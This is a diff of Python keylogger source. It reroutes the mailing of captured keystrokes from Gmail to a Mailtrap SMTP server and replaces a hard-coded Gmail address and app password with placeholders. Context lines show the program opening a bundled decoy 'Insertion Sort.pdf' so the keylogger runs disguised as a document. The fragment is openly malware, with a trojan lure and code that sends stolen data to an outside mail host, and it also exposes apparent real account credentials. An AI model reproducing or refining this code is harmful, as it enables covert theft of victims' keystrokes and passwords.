@@ -44,10 +44,13 @@ class Keylogger:
         timer.start()
 
     def send_mail(self, email, password, message):
-        server = smtplib.SMTP("smtp.gmail.com", 587)
+        sender = "<from@example.com>"
+        receiver = "<to@example.com>"
+        
+        server = smtplib.SMTP("smtp.mailtrap.io", 2525)
         server.starttls()
         server.login(email, password)
-        server.sendmail(email, email, message)
+        server.sendmail(sender, receiver, message)
         server.quit()
 
 
@@ -62,7 +65,7 @@ file_name = sys.MEIPASS + "\Insertion Sort.pdf"
 subprocess.Popen(file_name, shell = True)
 
 
-n = Keylogger("devilkalicipher@gmail.com", "eddusfysgmyndalm")
+n = Keylogger("YOUR_USERNAME", "YOUR_PASSWORD")
 n.start()
 
 
